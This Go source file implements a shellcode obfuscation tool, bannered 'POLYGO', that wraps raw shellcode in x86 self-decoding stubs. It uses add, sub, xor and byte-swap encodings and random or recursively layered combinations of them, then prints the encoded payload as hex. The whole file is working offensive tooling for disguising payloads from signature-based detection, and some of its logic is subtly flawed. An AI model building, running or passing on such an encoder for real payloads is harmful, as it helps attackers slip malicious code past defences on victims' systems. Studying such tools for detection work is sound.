package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"time"
)

func add(shellcode []byte, nb int) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x6c\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(nb)

	for i := range shellcode {
		shellcode[i] += byte(nb)
	}
	return append(decoder, shellcode...)
}

func sub(shellcode []byte, nb int) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x44\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(nb)

	for i := range shellcode {
		shellcode[i] -= byte(nb)
	}
	return append(decoder, shellcode...)
}

func xor(shellcode []byte, nb int) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x74\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(nb)

	for i := range shellcode {
		shellcode[i] ^= byte(nb)
	}
	return append(decoder, shellcode...)
}

func swap(shellcode []byte) []byte {
	decoder := []byte("\xeb\x20\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x00\x8a\x44\x0e\xff\x8a\x5c\x0e\xfe\x88\x5c\x0e\xff\x88\x44\x0e\xfe\x80\xe9\x02\x75\xeb\xeb\x05\xe8\xdb\xff\xff\xff")

	sc_len := len(shellcode)
	if sc_len%2 != 0 {
		shellcode = append(shellcode, 0x90)
		sc_len += 1
	}
	decoder[10] = byte(sc_len)
	for i := 0; i < sc_len; i += 2 {
		shellcode[i], shellcode[i+1] = shellcode[i+1], shellcode[i]
	}
	return append(decoder, shellcode...)
}

func display_sc(shellcode []byte) {
	fmt.Println("\nShellcode len:", len(shellcode))
	fmt.Printf("\nShellcode: \n")
	for i := range shellcode {

		fmt.Printf("\\x%02x", shellcode[i])
	}
	fmt.Println()
}

func random(shellcode []byte) []byte {
	nb := rand.Intn(255) + 1
	method := rand.Intn(4)
	if method == 0 {
		fmt.Printf("[+] Add method (0x%x)\n", nb)
		return add(shellcode, nb)
	} else if method == 1 {
		fmt.Printf("[-] Sub method (0x%x)\n", nb)
		return sub(shellcode, nb)
	} else if method == 2 {
		fmt.Printf("[^] Xor method (0x%x)\n", nb)
		return xor(shellcode, nb)
	} else if method == 3 {
		fmt.Printf("[~] Swap method \n")
		return swap(shellcode)
	}
	return shellcode
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func crazy(shellcode []byte) []byte {
	order := rand.Perm(4)
	for i := range order {
		nb := rand.Intn(255) + 1
		if i == 0 {
			shellcode = add(shellcode, nb)
			fmt.Printf("[+] Add method (0x%x)\n", nb)
		}
		if i == 1 {
			shellcode = sub(shellcode, nb)
			fmt.Printf("[-] Sub method (0x%x)\n", nb)
		}
		if i == 2 {
			shellcode = xor(shellcode, nb)
			fmt.Printf("[^] Xor method (0x%x)\n", nb)
		}
		if i == 3 {
			shellcode = swap(shellcode)
			fmt.Printf("[~] Swap method \n")
		}
	}

	return shellcode
}

func brainless(shellcode []byte, rounds uint) []byte {
	for i := 0; i < int(rounds); i++ {
		shellcode = random(shellcode)
	}
	return shellcode
}

func banner() {
	fmt.Print(`

			██████╗  ██████╗ ██╗  ██╗   ██╗ ██████╗  ██████╗ 
			██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔════╝ ██╔═══██╗
			██████╔╝██║   ██║██║   ╚████╔╝ ██║  ███╗██║   ██║
			██╔═══╝ ██║   ██║██║    ╚██╔╝  ██║   ██║██║   ██║
			██║     ╚██████╔╝███████╗██║   ╚██████╔╝╚██████╔╝
			╚═╝      ╚═════╝ ╚══════╝╚═╝    ╚═════╝  ╚═════╝ 
                  
			
					made with ♥ by leco & atsika

	`)
}

func main() {

	banner()
	rand.Seed(time.Now().UnixNano())
	nb := rand.Intn(255) + 1

	arg_brainless := flag.Uint("brainless", 0, "Specify the number of recursive encapsulated obfuscation methods")
	arg_crazy := flag.Bool("crazy", false, "Recursively obfuscate the shellcode with all methods")
	arg_file := flag.String("f", "", "File with the shellcode")
	arg_xor := flag.Bool("xor", false, "Use xor ofuscation")
	arg_add := flag.Bool("add", false, "Use add ofuscation")
	arg_sub := flag.Bool("sub", false, "Use sub ofuscation")
	arg_swap := flag.Bool("swap", false, "Use swap ofuscation")
	arg_rdm := flag.Bool("random", false, "Use random ofuscation")

	flag.Parse()

	shellcode, err := ioutil.ReadFile(*arg_file)
	check(err)

	if *arg_file == "" {
		fmt.Printf("Usage :\t./binary -f <path_to_file> <args>\n\ntry -h for help menu\n\n")
		os.Exit(1)
	}

	if *arg_add {
		display_sc(add(shellcode, nb))
	} else if *arg_sub {
		display_sc(sub(shellcode, nb))
	} else if *arg_xor {
		display_sc(xor(shellcode, nb))
	} else if *arg_swap {
		display_sc(swap(shellcode))
	} else if *arg_rdm {
		display_sc(random(shellcode))
	} else if *arg_crazy {
		display_sc(crazy(shellcode))
	} else if *arg_brainless != 0 {
		display_sc(brainless(shellcode, *arg_brainless))
	} else {
		fmt.Printf("Usage :\t./binary  <args>\n\ntry -h for help menu\n\n")
		os.Exit(1)
	}
}
